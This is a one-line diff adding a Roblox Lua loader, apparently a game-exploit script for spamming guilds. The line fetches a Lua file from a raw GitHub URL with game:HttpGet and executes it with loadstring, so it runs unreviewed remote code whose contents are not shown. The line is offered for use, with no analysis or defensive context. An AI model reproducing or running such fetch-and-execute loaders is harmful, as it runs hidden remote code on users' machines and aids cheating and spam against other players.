@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/the-forge-guilds-spam7-m0j22foxo6phbf.lua"))()
